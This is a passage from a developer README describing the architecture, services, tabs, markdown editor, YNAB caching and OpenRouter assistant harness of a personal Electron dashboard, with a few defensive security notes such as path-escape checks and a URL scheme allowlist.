# Command Center

Personal desktop dashboard — one place to reach services, notes, and tools.
Electron app, React + TypeScript, built with electron-vite.

## Stack

- **Electron** (^33) — desktop shell.
- **electron-vite** + **Vite** — build tooling for main/preload/renderer.
- **React 19 + TypeScript** — renderer UI; main/preload are TS too.
- **Node 22 (LTS)** — pinned. See gotcha below.
- **electron-builder** — packages the app into a real macOS `.app` (`npm run package`),
  so it can run without a terminal attached at all.
- **CodeMirror 6** — the markdown editor behind Scratchpad/Notes/Daily Note/
  Finance Review Log, plus `@lezer/markdown` as the parser shared by both the
  editor and the static preview renderer. See "Markdown editor" below.
- **better-sqlite3** — persists everything: the Local Apps / Learning / Claude Code
  lists (display order + CRUD), the Notes tab's nav list + open-tabs session, Habits,
  the Scratchpad, and — as of the Settings page — all app configuration (API tokens,
  vault paths, GitHub repos, managed processes, refresh intervals). `config.json` is
  no longer read at runtime; see "Settings" below.

## Requirements

- **Node 22 LTS.** Do NOT use Node 26+ — Electron's prebuilt binary download silently
  no-ops on too-new/non-LTS Node lines, producing a stub `node_modules/electron/dist/`
  with no `path.txt` and the runtime error "Electron failed to install correctly."
  If you hit that: check `node --version` first. `nvm use 22` and reinstall.

## Architecture

Three walled-off parts — this separation is the security model, keep it intact:

- **Main process** (`src/main/`) — Node.js, full OS access. Window creation + IPC handlers.
  - `index.ts` — app entry, window setup, registers all `ipcMain.handle` channels.
    Branches on `process.env.ELECTRON_RENDERER_URL`: dev mode loads the Vite dev
    server URL, production loads the built `out/renderer/index.html`. Holds no
    module-level config state — every handler reads settings fresh per call via
    `services/settings.ts`, so a Settings edit takes effect on the next call, no
    restart needed.
  - `services/db.ts` — owns the single shared `better-sqlite3` connection
    (`app.getPath("userData")/command-center.db`, WAL mode). `initDatabase()` opens
    it; every other DB-backed service imports `getDatabase()` from here and creates
    its own tables in its own `init*()`.
  - `services/settings.ts` — all app configuration, SQLite-backed. Scalar sections
    (`grimoire`, `docker`, `app`, `todoist`, `googleCalendar`, `reader`, `github`'s
    non-array fields, `openrouter`, `openai`, `firecrawl`) are JSON blobs in a
    generic `settings(key, value)` table — no
    schema migration needed when a section's shape changes, only the TS type. The
    array sections (`vaults`, `github_repos`, `processes`, `youtube_channels`,
    `subreddits`) get their own tables with full list/add/update/remove/reorder
    CRUD, same shape as `services/links.ts`. `readLegacyConfigFile()` + `seedSettingsFromLegacyConfig()`
    run once at boot: read `config.json` if present (dev: repo root; packaged: an
    existing install's userData copy) or fall back to bundled `config.example.json`
    defaults, and seed any table/row that's still empty — idempotent, safe every
    boot, and this app never writes to `config.json` again afterward. See
    "Settings" below for the full migration story.
  - `services/docker.ts` — shells out to `docker ps`, parses JSON-lines output.
  - `services/grimoire.ts` — reads Obsidian vault markdown directly from disk, given
    the current `grimoire` settings section. `readDailyNote` distinguishes "no
    note for this day yet" (`missing: true`, by statting the daily-log folder)
    from a real failure like a bad vault path, so the widget can offer an empty
    editable note in the first case — `saveDailyNote` writes unconditionally
    and creates the file, so nothing else is needed to start today's log from
    the dashboard. Deliberately never mkdir's the folder itself; inventing
    vault structure out from under Obsidian isn't this app's business.
  - `services/todoist.ts` — calls the Todoist REST API for due/overdue tasks, given
    the current `todoist` settings section.
  - `services/launcher.ts` — opens a terminal at a dir and runs a command (macOS:
    writes a Warp Tab Config and opens it via `warp://tab_config/...`; Linux/Windows stubbed).
  - `services/forklift.ts` — opens a local directory in ForkLift via `open -a
    ForkLift <path>` (macOS-only, fails soft elsewhere). Backs the File Links widget.
  - `services/googleCalendar.ts` — Google Calendar API v3 via OAuth (loopback + PKCE,
    no dependency beyond `node:http`/`node:crypto`), given the current `googleCalendar`
    settings section. Tokens cache to `app.getPath("userData")/google-tokens.json` —
    never in git, never in the settings DB.
  - `services/links.ts` — SQLite CRUD + reorder for the Local Apps / Learning /
    Claude Code lists, one table per list (imports its DB connection from `db.ts`).
    One-time migration seeds it from `config.json`'s old `localApps`/`learning`/
    `claudeCode` arrays if a table is empty — independent of and unrelated to the
    `settings.ts` migration above, since these arrays left `AppConfig` earlier.
  - `services/reader.ts` — Readwise Reader API v3 for the latest saved documents,
    given the current `reader` settings section. Cursor-paginated upstream, so this
    keeps a small in-memory cache and does the sort-by-saved-date + 15-per-page
    slicing itself. Fetches `new`, `later` and `shortlist` as three separate
    `location=` streams — an unfiltered list is newest-*updated* first and mostly
    feed items on a real account, which left only a day or so of saved documents
    after the client-side filter. Streams are merged only down to the point every
    still-paging one has reached (`horizon()`, from the smallest `updated_at`
    fetched: a document is never saved after it was last updated), so a document
    can't go missing from the middle. Archive is deliberately not fetched.
  - `services/githubReleases.ts` — latest release from each repo you've
    **starred**, via a single GraphQL query. Starring is the subscription, so
    there's nothing to configure; it reuses `github.ts`'s token. GraphQL rather
    than REST is load-bearing: REST has no "releases across starred repos"
    endpoint, so it would take one `/user/starred` call plus one
    `/releases/latest` per repo — 100+ requests per poll against a budget
    shared with the GitHub widget. Note GraphQL reports failures as a **200
    with an `errors` array**, so a bad scope never shows up as a non-2xx.
    Results are windowed to 90 days: without that the list is "every starred
    repo's last release", which is inventory, not news.
  - `services/readerFeed.ts` — the RSS half of Readwise Reader (`location=feed`),
    which `reader.ts` deliberately filters out. Same token, no new integration:
    subscriptions are managed in Reader itself. Filters **server-side**, unlike
    `reader.ts` which pages everything and discards feed items client-side —
    fine at that file's scale, hopeless here, since a real account holds
    thousands of feed items. Also does move-to-inbox (`location: "new"`) and
    mark-as-read, the latter through the API's `bulk_update` endpoint in
    batches of 50 (its own cap).
  - `services/github.ts` — GitHub REST API for latest Actions run + open PR count
    per configured repo, plus a cross-repo review-requested search, given the
    current `github` scalar settings + `github_repos` table combined. Skips rows
    with no `owner`/`repo` (see `git.ts` below) so a local-only repo never
    produces an API call.
  - `services/git.ts` — local working-tree status (`git status --porcelain=v2
    --branch` + a one-line `git log`) for every `github_repos` row that has a
    `localPath`. The counterpart to `github.ts`: that one asks the API about CI
    and PRs, this one answers "do I have uncommitted work, and am I behind?"
    from disk, for free. Parses porcelain **v2** deliberately — v1 is ambiguous
    around renames and spaces in paths. A file that's both staged and further
    edited counts toward `staged` *and* `unstaged`; those are independent
    counters, not an either/or. Fails soft per repo (`ok: false` + reason on the
    row) so one bad path doesn't blank the widget. Note it does **not** copy
    `docker.ts`'s PATH widening: that exists because Docker Desktop installs
    outside launchd's bare PATH, whereas `git` is at `/usr/bin/git` and resolves
    fine from a GUI-launched app.
  - `services/ynab.ts` — YNAB REST API (api.ynab.com/v1): account balances,
    unapproved transactions, this month's scheduled transactions, categories,
    and the approve/clear/categorise/memo mutations behind the Finances tab.
    Fails soft like the other API services. Accounts, payees and scheduled
    transactions go through the delta cache in `ynabDelta.ts` (see "YNAB history
    and delta requests" below); `ynabInsights.ts` holds the read-only history views.
  - `services/bills.ts` / `services/cards.ts` — manually-tracked recurring bills
    and credit cards for the Finances tab. Plain SQLite CRUD, same shape as
    `links.ts`. Deliberately independent of YNAB's own scheduled transactions:
    not everything recurring is set up as a YNAB schedule (a bill paid from an
    external account, say), so this is a parallel list rather than a mirror.
    `bills.ts` also carries the additive-`ALTER TABLE`-in-a-try/catch migration
    pattern that `settings.ts`'s `local_path` column later copied.
  - `services/timeTracking.ts` — cumulative time logged against Todoist tasks,
    for client billing, plus the monthly report. A row is only written once time
    is actually logged, so there's no shadow row per Todoist task.
    `task_content`/`project_name` are **snapshotted per entry** rather than
    looked up live, so a monthly report still reads correctly after the upstream
    task is completed or deleted. Only one timer runs at a time — starting one
    auto-stops whichever was running.
  - `services/claudeUsage.ts` + `services/claudePricing.ts` — token and cost
    accounting for Claude Code, read from the transcripts it already writes to
    `~/.claude/projects`. See "Claude Code usage" below — the three correctness
    constraints there are easy to break and produce plausible-looking numbers
    when broken.
  - `services/firecrawlWeb.ts` — web search and page reading for the Assistant (see
    "Assistant tab"); same key as below, kept apart from the usage widget.
  - `services/firecrawl.ts` — team credit usage from Firecrawl's v2 API,
    given the current `firecrawl` settings section. `GET /v2/team/credit-usage`
    is remaining / plan / billing period; remaining can exceed planCredits
    because the plan allotment excludes coupons, packs, and auto-recharge.
    Actual spend is `GET /v2/team/credit-usage/historical` (month buckets, plus
    `?byApiKey=true` for the by-key panel). Historical is additive — if it
    fails, remaining/plan still show. Fails soft with no key.
  - `services/windowState.ts` — remembers the dashboard window's size, position
    and maximized/fullscreen state in a `window` settings blob. Uses
    `getNormalBounds()`, **not** `getBounds()`: while maximized or fullscreen the
    latter returns the expanded rectangle, so persisting it would make
    un-maximizing later snap to a screen-sized window instead of whatever the
    user actually had. Saved bounds are checked against the current displays
    before use — a window restored onto a since-disconnected monitor is
    invisible and reads as a failed launch. Saves are debounced (`resize` fires
    continuously through a drag and each save is a synchronous SQLite write),
    with a flush in `before-quit` since close hides rather than destroys and
    there's no close event to save on.
  - `services/dailyTemplate.ts` — renders an Obsidian template into the content
    for a daily note that doesn't exist yet. See "Daily note template" below.
  - `services/backup.ts` — daily rotating backups + manual export of the SQLite
    file. See "Backups" below; the `db.backup()`-not-`fs.copyFile` detail there
    is the important part.
  - `services/capture.ts` + `services/captureWindow.ts` — global-hotkey quick
    capture. See "Quick capture" below.
  - `services/notifications.ts` — OS notifications, given an already-decided
    alert (transition detection happens in the renderer, where the polled state
    lives — see "Notifications + tray" below). Exists mainly to make failure
    *visible*: it reports `Notification.isSupported()` and captures the `failed`
    event, so Settings can say macOS rejected a notification instead of the app
    silently appearing to work.
  - `services/tray.ts` — the menubar status item: a summary line, Show /
    Refresh all / Quit, plus a count badge via `setTitle` only when something is
    actually wrong. Its icon comes from `trayIcon.ts` (embedded base64 template
    PNGs) rather than from disk — see that file for why. No `click` handler:
    with a context menu attached, macOS opens the menu on left-click, and a
    click handler on top of that made one click both open the menu and raise
    the window.
  - `services/notes.ts` — browses/reads/writes markdown files directly in
    configured Obsidian vaults (`settings.ts`'s `vaults` table, looked up by label
    via `listVaultSettings()`) for the Notes tab. All paths are resolved and
    checked against the vault root before any read/write, so a stray `../` can't
    escape the vault. The left-nav pin list and open-tabs session live in SQLite
    (`notes` / `notes_session` tables) — they only ever reference a file by
    `(vaultLabel, filePath)`, never copy its content, so the file on disk stays the
    single source of truth. Writes are mtime-guarded and `statNotes` batches
    freshness checks — see "Notes tab" below for the conflict model.
  - `services/processes.ts` — starts/stops/tails arbitrary long-running local
    processes configured in Settings' Processes section (dev servers, watchers,
    tools like `opencode`). In-memory only (no writes back to the `processes`
    table beyond what Settings already does) — a `Map<id, { child, logs, exitCode }>`
    is the sole source of runtime truth, keyed by the same `id` used in Settings; a
    process that's never been started this session just has no entry. Not a
    terminal emulator — no PTY/`node-pty`/`xterm.js`, no interactive stdin, just
    spawn + capped log-tail + a reliable kill. Spawns with `detached: true` on
    macOS/Linux so the child is its own process group leader, and stops it
    with `process.kill(-pid, "SIGTERM")` (escalating to `SIGKILL` after 3s)
    — a plain `child.kill()` only hits the parent and would orphan a dev
    server's own forked children. Windows has no such group signaling, so it
    uses `taskkill /pid <pid> /T /F` instead, which walks the real process
    tree; no `tree-kill` dependency needed for either path. Killed en masse
    via `stopAll()` on `app`'s `before-quit` (main/index.ts holds quitting up
    until the kills resolve) so closing the dashboard never leaves an
    orphaned server running.
- **Preload** (`src/preload/index.ts`) — the ONLY bridge. Exposes a small named API
  (`window.api.*`) via `contextBridge`, typed as `CommandCenterApi`. Renderer can't
  reach Node except through this. `index.d.ts` augments `Window` so every component
  gets `window.api` typing for free.
- **Renderer** (`src/renderer/src/`) — sandboxed React UI. Talks to main only through
  `window.api`. No `fs`, no `exec`, no `require` here.
- **Shared** (`src/shared/types.ts`) — the typed contract (`AppConfig`, each service's
  result shape, `CommandCenterApi`) used by main, preload, and renderer alike.

### Data flow

UI event → `window.api.x()` (preload, typed) → `ipcRenderer.invoke("channel")` →
`ipcMain.handle("channel")` (main) → service does the work → result returns up the chain.

## Conventions

- **Settings over config files.** Anything user-specific (paths, ports, instances,
  tokens, projects) lives in the SQLite-backed settings store, edited through the
  Settings page (gear icon) — never hardcoded, and no longer hand-edited in a JSON
  file at runtime. See "Settings" below for the full model and the one-time
  `config.json` migration.
- **Adding a widget** = five touch points, in order:
  1. Shared types in `src/shared/types.ts`, if the data shape is new.
  2. Service function in `src/main/services/*.ts` (if it needs OS access).
  3. `ipcMain.handle("thing:action", ...)` in `src/main/index.ts`.
  4. Expose it in `src/preload/index.ts` under `window.api` (+ add to `CommandCenterApi`).
  5. Component in `src/renderer/src/components/*.tsx`, wired into `App.tsx`'s state.
  If the widget needs new user-editable config, add a matching scalar section or
  array table to `services/settings.ts` and a section to `SettingsPage.tsx` rather
  than a new `config.json` field.
- **Fail soft.** Services return `{ ok: false, reason }` instead of throwing, so a widget
  shows a friendly message (e.g. "Docker isn't running") rather than blanking the app.
  This is enforced by the shared TS result types, not just convention.
- **OS-specific code is branched on `process.platform`** (`darwin` / `win32` / else).
  `launcher.ts` is macOS-first (Warp); the other branches are stubs to fill in.
- **Feature state generally lives in `App.tsx`.** Fast telemetry belongs in
  `StatsPanel.tsx` so its updates do not rerender unrelated widgets. Poll using
  `usePolling`, with explicit visibility gating; background work must support
  notifications, tray status, or the optional network-history setting.

## Tabs

The dashboard is split into tabs so lesser-used widgets don't crowd the main
view. All widget data still loads and polls in the background regardless of
which tab is active — only the JSX rendered under `<main>` is tab-gated, state
lives in `App.tsx` same as always.

- **Home** — Due & Overdue, Today's Log, Today's Schedule (Google Calendar), Active
  Missions, Local Apps, Learning, File Links.
- **Development** — GitHub (CI + PRs), Git (local working-tree status),
  Services (Docker), Claude Code, Releases (latest releases from starred
  repos), Processes (managed local processes).
- **Reader** — two sub-tabs over the same Readwise account: **Saved** (the
  articles you've saved, paginated) and **Feed** (your RSS subscriptions).
- **Finances** — YNAB accounts + scheduled transactions, manually-tracked Bills
  and Cards, the Finance Review Log (a markdown note), and YNAB's unapproved
  transactions with inline category/memo editing. Budget Health shows spent vs
  budgeted per category as a bar (this month's activity over this month's
  budgeted amount, not the rolled-over balance).
- **AI** — four sub-tabs over Claude / Firecrawl / OpenRouter / OpenAI:
  **Claude** (local Claude Code token/cost usage — today, 7d, 30d, by-project
  and by-model, recent sessions with Resume; see "Claude Code usage" below),
  **Firecrawl** (remaining credits, this-period spend, month history, by API key),
  **OpenRouter** (usage-by-model / by-key + credit balance), **OpenAI** (local
  Codex subscription telemetry plus Admin API usage/cost; see "Codex
  subscription usage" below).
- **Social** — recent YouTube uploads across configured channels (one
  side-scrolling, date-ordered strip) and recent posts per subreddit (one
  sub-tab each). See "Social tab" below.
- **Debt** — paydown plan: debts, an extra monthly amount, dated one-time
  payments, and a Snowball / Avalanche / Custom / Minimums-only switcher with
  side-by-side results and a Markdown export. See "Debt tab" below.
- **Scratchpad**, **Habits**, **Notes** — custom full-tab layouts rather than a grid
  of widgets (see below); each gets one full-bleed `.slot` instead of the
  five-touch-point widget pattern.

**Tab order, labels and visibility are DB-backed**: they live in the `tabs`
table (`services/settings.ts`) and are managed in Settings → Tabs — drag to
reorder, pencil to rename, eye to show/hide (`settings:tabs:reorder` / `rename` /
`setHidden`). The header strip itself is a plain row with no edit mode. A hidden
tab leaves the strip and the command palette but keeps its data; it still appears
while active, so a link or notification that lands on it doesn't leave you on an
unhighlighted tab. The last visible tab can't be hidden. The set of tabs is still
fixed in code — those handlers only reorder, relabel and hide existing rows.

Adding a new tab therefore means: an entry in `DEFAULT_TABS` in **both**
`App.tsx` and `services/settings.ts` (they're separate constants that must stay
in sync — `ensureTabDefaults()` seeds any missing row every boot, so a tab
added to only one of them silently won't appear), a new `.grid-<name>` CSS
block (grid-template-columns/areas), and a new
`{activeTab === "..." && <main>...}` block.

## Current widgets

Docker status (auto-refresh) · today's Grimoire daily note (editable, created
on first keystroke if it doesn't exist yet; prev/next navigation between
existing notes, deep link to open in Obsidian) · Google Calendar schedule
(prev/next day pagination, join-meeting link, expandable notes) · active missions ·
Todoist due/overdue tasks (grouped by project, with tags/subtasks) · Local Apps
launcher (SillyTavern, Open WebUI, OpenCode, etc.) · Learning launcher (courses/docs
links) · File Links launcher (opens a local folder in ForkLift) · Claude Code
launcher (opens in Warp) · Reader (latest Readwise Reader documents, paginated 15
at a time) · GitHub (per-repo latest CI run + open PR count, cross-repo
review-requested PRs, auto-refresh on `github.refreshSeconds`) · Git (local
working-tree status per configured repo path — branch, ahead/behind, staged/
unstaged/untracked/conflict counts, last commit; click to open in ForkLift) ·
Managed Processes (start/stop/tail arbitrary local tools, see below) · Now
Playing banner (track/artist/album + artwork while Spotify is actively
playing, see below).

Local Apps, Learning, and File Links all render via the generic
`LinkLauncherWidget` (`components/LinkLauncherWidget.tsx`) — a SQLite-backed
`LinkItem[]` list (`{ id, label, link, sortOrder }`, see `services/links.ts`)
with drag-to-reorder (`@dnd-kit`), inline add/edit/delete, and click-to-open.
Two optional props change what "open" means per list: `onLaunch` (defaults to
`window.api.openUrl`; File Links passes `window.api.forklift.open`, which
shells out to `open -a ForkLift <path>` via `services/forklift.ts`, macOS-only)
and `formatDisplay` (defaults to `toDisplayHost`, showing a URL's host; File
Links passes `toDisplayBasename`, showing a path's last segment instead).
`ClaudeLauncherWidget` is the same underlying idea rendered as a horizontal
chip row instead, launching a terminal rather than reusing `LinkLauncherWidget`
— its click behavior needed richer opening/opened/failed state feedback than
a plain launch button. All four talk to `window.api.links.*` (one more DB
table each, added to the `TABLES` map in `services/links.ts`) via the shared
`useLinkList` hook (`renderer/src/hooks/useLinkList.ts`).

## Notes tab

Browses into one or more configured Obsidian vaults (Settings' Vaults section —
separate from Grimoire's vault path in Settings, which only backs the Home tab's
daily note/missions), pins specific notes into a left nav grouped by vault,
opens several at once as tabs, and edits them with the same autosave pattern
as Scratchpad — no explicit save. Deleting a nav entry only removes that row,
never the file.

**Conflict safety.** Writes are mtime-guarded: `readNoteFile` returns the
file's `mtimeMs`, the renderer keeps it as a per-note baseline, and
`saveNoteFile` refuses to write (returning `{ conflict: true }`) if the file
changed underneath it — so editing a note in real Obsidian while it's open
here can no longer be silently overwritten. On window focus the widget
`notes:statMany`s every open note: a clean buffer silently reloads, a dirty
one gets a non-blocking Reload / Keep-mine bar. Passing no `expectedMtimeMs`
writes unconditionally, which is the first-save and "Keep mine" path. Same
trigger re-fetches vault indexes older than 60s, so a note created in
Obsidian resolves as a wikilink without a restart.

`components/NotesWidget.tsx` owns all the state itself (nav list, which notes
are open, per-note content cache, per-note debounced autosave, mtimes) — same
self-contained pattern as `ScratchpadWidget`/`HabitsWidget`. The one exception
is the nav list, mirrored up to `App.tsx` via `onNavChange` so the command
palette can offer pinned notes, with palette-initiated opens coming back down
as `pendingOpen` (same push-up/hand-down shape `SettingsPage` uses for
`processConfigs`). `components/NoteBrowserModal.tsx` is the "+" file-tree
browser (always opens at the vault root, lazy per-folder fetches via
`notes:browse`, no recursive walk). The editor pane is `MarkdownPane` (see
"Markdown editor" below); the Notes-specific CSS only covers the
nav/tab-strip/browser-modal chrome around it.

Open tabs + the active tab persist across restarts in a `notes_session`
singleton row (same shape as `services/scratchpad.ts`'s single-row table), so
relaunching the app restores where you left off.

## Markdown editor

CodeMirror 6 with Obsidian-style live preview, shared by four consumers:
Scratchpad, Notes, Daily Note (Home), and Finance Review Log. **Anything that
would otherwise be copied into all four belongs in one of the shared pieces
below** — they were byte-identical copies once and had already drifted in
three places before being extracted.

- `components/MarkdownPane.tsx` — the editing surface. Two exports, because
  consumers disagree about where the toolbar goes: `MarkdownPaneToolbar`
  (Write/Preview pills + word count + Saving…/Saved + a `children` slot) is
  placed by the consumer (Panel `headerRight` for Scratchpad/Finance, an
  in-body toolbar for Notes/Daily Note), while the default export renders the
  formatting toolbar, the editor, and the rendered-preview pane. It owns the
  task-toggle splice, the `includeFrontmatter: false` + `<FrontmatterBlock>`
  pairing, and the bridging between the editor's `[[target]]` wikilink
  callback and the preview's resolved `(filePath, label)` one. `docKey` is
  **required**: it's the editor's React key, and frontmatter-collapsed-by-
  default only applies at `EditorState` creation, so reusing one instance
  across two documents would carry fold state over.
- `hooks/useAutosave.ts` — keyed debounced save. **Unmount flushes rather than
  cancelling**; the previous per-widget copies all `clearTimeout`'d on unmount,
  so switching tabs inside the 500ms window silently dropped the last edit.
  Also flushes on `beforeunload`. `isPending(key)` backs the conflict check
  above; `cancel(key)` is for callers about to write something else themselves
  (Scratchpad's Clear).
- `lib/markdownEditor.ts` — extension assembly plus every editing command
  (`toggleBold`, `setHeadingLevel(n)`, `toggleBulletList`, `insertTable`, …),
  exported so `components/MarkdownToolbar.tsx` can dispatch them. Line-prefix
  commands go through `editSelectedLines`, **not** `state.changeByRange` — a
  multi-line selection needs one change per *line*, not per range. List
  toggles reuse `matchListLine`, the single definition of what counts as a
  list, shared with `continueList` and kept in step with the preview renderer.
- `lib/markdownCompletions.ts` — `[[` vault-note picker and `/` block
  snippets. The wikilink source is vault-dependent, so `NotesWidget` supplies
  it and the other three get slash commands only. `completionKeymap` is
  registered at `Prec.highest`, which is safe because `acceptCompletion`
  returns false with no popup open and falls through to `continueList`.
- `lib/clickableLinks.ts` + `lib/linkDestination.ts` — Mod+click to follow a
  link, with a Mod-held hover underline so the gesture is discoverable at all.
  `linkDestination` is the shared answer to "what does this node point at",
  used both by the click handler and by the decoration that marks it, so the
  thing that *looks* followable and the thing that *is* can't diverge. Covers
  bare `URL` nodes (a pasted `https://…`, which has no wrapper node) as well
  as `Link`/`Image`/`Autolink`/`WikiLink`.
- `lib/urls.ts` — `safeUrl` scheme allowlist applied to every emitted
  `href`/`src`, and `normalizeBareUrl` for GFM autolinks. C0 control
  characters are stripped before the scheme test, because browsers strip them
  while parsing and `java\nscript:` would otherwise pass.
- `lib/editorSearch.ts`, `lib/markdownPaste.ts`, `lib/outline.ts` — Mod-F
  find/replace, paste-URL-over-selection → `[text](url)`, and the heading
  outline behind `components/OutlineButton.tsx`.

**Two compartments** (`completionCompartment`, `placeholderCompartment`) let
those change after mount without recreating the view and losing undo history —
the vault index arrives asynchronously. Nothing else gets one; a compartment
per extension is ceremony. `MarkdownEditor` reports its view via an
`onViewReady` callback rather than an imperative handle, because
`useImperativeHandle` is a *layout* effect and fires before the passive effect
that creates the view.

All CodeMirror styling lives in `EditorView.theme()` next to the feature it
belongs to, never in `styles.css` — which holds only the React chrome around
the editor (`.md-toolbar`, `.md-conflict`, `.md-outline-*`, `.scratchpad-*`).

## YNAB history and delta requests

`services/ynabDelta.ts` keeps an in-memory copy of each unfiltered YNAB collection
and sends `last_knowledge_of_server`, merging the changed rows (deleted ones are
flagged, not omitted). Nothing is persisted: a restart is one full fetch. **Never
use it on a server-side-filtered request** — a delta against `?type=unapproved`
never reports a row that *left* the filter, so approved transactions would stay in
the cache; that is why `getUnapprovedTransactions` still fetches in full.
Categories are not delta-cached either: their nested groups would need a merge
whose semantics weren't verifiable without a live token.

`services/ynabInsights.ts` stores nothing. **Spending trends** come from
`/months` (delta-cached) plus one `/months/{m}` per month for category detail;
past months are reused for 30 minutes unless their totals change, the current
month is always refetched. The "Credit Card Payments" group is excluded or every
card purchase would count twice. **Net worth** is worked backwards from current
balances (balance now minus everything dated after each month), so it is right
from the first poll with no snapshots to record; closed accounts are kept (a
transfer out of one needs both legs) and accounts hidden in the Accounts widget
are left out. **Money movements** is `/money_movements`, null side = Ready to
Assign.

**Credit-card utilization trend** (Bills/Cards widget → Utilization) uses the same
backwards reconstruction per account (`getAccountBalanceHistory`, sharing net
worth's transaction fetch). The renderer combines it with each card's manually
tracked limit — measured against *today's* limit for every month, since YNAB has
no record of past limits — and the last point is the live balance. Only a
negative balance counts as owed; an overpaid card is zero, not debt.

Mutations (all plain `ipcMain.handle`, never `readHandler`): `importTransactions`
(Direct Import), `approveTransactions` (bulk PATCH, chunks of 100, reports how far
it got), `splitTransaction` (re-reads the transaction from YNAB and checks the
lines sum to its real amount in milliunits before PATCHing `subtransactions`; YNAB
cannot edit the lines of an existing split, so the UI offers Split only on plain
rows). The renderer sends the ids it showed for bulk approve, only categorised or
split rows, behind a confirm click.

## Assistant tab

A chat harness: a tool-using agent loop over OpenRouter's OpenAI-compatible
chat completions API (plain `fetch`, no SDK), with persistent chats, a memory
file, and a quick panel summoned by a global hotkey. API key, model slug,
standing instructions, memory-file path and the hotkey are Settings → Assistant
(its own section, deliberately not buried in Integrations; the tab's header
"Settings" link and any setup error open straight to it via `SettingsPage`'s
`initialSection`).

**Where things live** (all `src/main/services/`):
`assistant.ts` the loop and conversation state · `assistantClient.ts` one
streamed request + SSE parser · `assistantTools.ts` tool schemas, execution and
the approval rules · `assistantLinks.ts` the outbound-link check · `assistantMemory.ts` the memory file · `assistantChats.ts`
SQLite · `assistantCompaction.ts` summarize-and-continue · `assistantTranscript.ts` pure helpers (message types, titles,
`toTranscript`) · `assistantWindow.ts` the quick panel · `assistantSpend.ts`
the per-day spend ledger · `assistantModels.ts` the Settings model check. Renderer:
`hooks/useAssistantChat.ts` (all chat state, shared) · `AssistantChat.tsx`
(transcript + composer, shared) · `AssistantWidget.tsx` (the tab: history,
memory) · `AssistantQuickApp.tsx` (the panel). `src/shared/assistant.ts` holds
constants both sides must agree on (`ASSISTANT_MUTATING_TOOLS`, the default
hotkey) — a drift there is silent.

- **The key is a regular OpenRouter inference key, not the Management key** the
  OpenRouter usage widget uses — OpenRouter rejects management keys for
  completions, so they're separate fields. The **model has no default** on
  purpose: slugs churn, and it must support tool calling (OpenRouter's 400 for
  one that doesn't is passed through verbatim). A rejected key sets
  `needsSetup`, which makes the UI offer a button into Settings.
- **Chats persist and resume.** One metadata row per chat in `assistant_chats`
  and one row per message in `assistant_messages` (ordered by `seq`; a save
  rewrites a chat's rows in one transaction, since it is only ever read or
  replaced whole). The old `messages` JSON column is kept as an untouched
  backup: boot copies any chat that has no message rows yet, and new chats
  write `'[]'` there. The renderer holds display text and an opaque `conversationId`; the
  live `conversations` map is a cache — an unknown id is loaded from the
  database, which is also how a chat resumes after a restart. A chat is written
  only after a turn **succeeds**, so a failed first question leaves no row. A
  failed save never fails the reply. **Titles are two-stage**: a new chat is saved
  with its first question as a placeholder, then upgraded to a 3–6 word
  model-written title (on by default; Settings has an on/off toggle and a separate
  **Title model**, blank = the main model, since a cheap one is plenty). The title
  request is **sent on the first message, right behind the reply's own request**
  and runs beside it (`startTitle`, from the question alone), so it is normally
  already in hand when the reply lands. It is *applied* only after the chat has
  been saved (`applyTitle` — the row doesn't exist until the first reply
  succeeds), and never delays the reply. A failed or stopped first turn aborts
  the request (it is not left running). The upgrade is one atomic
  `UPDATE … WHERE title = <placeholder>` (`renameChatIfUnchanged`), so a rename
  made while the request is in flight always wins; any failure, an empty or
  unusable result (`cleanTitle` strips quotes/markdown/reasoning preambles), a
  stopped first turn, or a resumed chat leaves things as they are. **The budget is
  256 output tokens, not 40**: a reasoning model spends its budget thinking, and
  at 40 it had nothing left to say, so the placeholder silently stayed. Failures
  are `console.warn`ed (including "ran out of tokens — pick a plain Title model")
  rather than surfaced in the UI. No tools — and the client omits `tools`
  entirely rather than sending `[]`, which OpenAI-style APIs reject. Its tokens
  and cost are added to the chat (`addChatUsage`, which does not reorder the list)
  even when the title is thrown away; the tab header shows that after the chat is
  next opened. The dashboard learns a title landed via `app:command` →
  `assistantChatTitled` (no third push channel). A **rename or pin
  is never overwritten by a later reply** (the upsert leaves `title`/`pinned`
  alone). Columns were added by additive migration — keep it
  that way.
- **Compaction** (`assistantCompaction.ts`, pure) keeps long chats cheap
  without deleting anything. Past `compactAtTokens` (estimated chars/4; default
  30k, 0 = off, Settings → Assistant) a turn first summarizes everything before
  the last 4 user turns on the main model, **marks** those messages `archived`
  and inserts one `summary` system message at the cut. `toWire` is the single
  function deciding what the model is sent: it drops archived rows, appends the
  latest summary to the system prompt (still one system message), strips the
  bookkeeping flags, and trims tool output over 2000 chars from turns older than
  the recent window. The cut is always on a user message, so a `tool_calls`
  message never loses its results. The transcript and search keep seeing the
  full history, with a divider where the summary sits (`role: "summary"`;
  summary text is not searchable). A failed summary never fails the turn — it
  just goes ahead uncompacted. An automatic summary must fold away at least a
  quarter of the threshold (`MIN_FOLD_SHARE`, measured by `foldedTokens`), or it
  is skipped: otherwise a chat whose last 4 turns alone are over the threshold
  paid for a summary on every turn, each folding one short turn. The size is
  `estimateWireTokens`, which counts images flat without reading them. The
  summary is saved immediately, not with the
  reply, and its cost is added to the chat like a title's. Regenerate never
  compacts. The tab's **Compact** button does it on demand
  (`assistant:chats:compact`); a reply that compacted carries `compacted: true`
  so the renderer reloads its transcript.
- **A turn is atomic.** History is only ever left in a state a provider accepts:
  an assistant message with `tool_calls` and **all** its `tool` results are
  pushed together after the tools finish; a failed turn restores a snapshot; a
  stopped one is closed with an ordinary assistant message. Never push a
  `tool_calls` message ahead of its results. **Except once a change has run**: if
  a mutating tool (or `remember`) succeeded and a later step fails, the turn is
  *not* rolled back but closed with a `(The reply couldn't be finished: …)`
  assistant message (`failTurn`), so a paid-for image or a completed task stays
  in the chat and the model knows it happened. Tool-call ids are made unique per
  chat before anything uses them (`withUniqueCallIds`; providers may send none or
  repeat one), and batch verdicts are matched to calls by position, never by id.
- **The system prompt is never stored.** It carries today's date, a snapshot of
  the memory file and the user's standing instructions, all stale by resume
  time, so it is rebuilt on every (re)load and frozen within a running chat.
- **The on-screen transcript is derived.** `toTranscript` rebuilds it from the
  messages (one assistant item per user turn, all steps joined by a blank line,
  chips from `tool_calls`, remembered facts from successful `remember` calls)
  and must agree with what the live reply showed — `cleanFact` is shared for
  that reason.
- **Replies stream** over a second main→renderer channel, `assistant:delta`
  (tagged with a renderer-chosen `requestId`, sent only to the asking window),
  while `assistant:ask` is still pending; the resolved reply is authoritative
  and replaces the streamed bubble. Tool-call fragments are assembled by
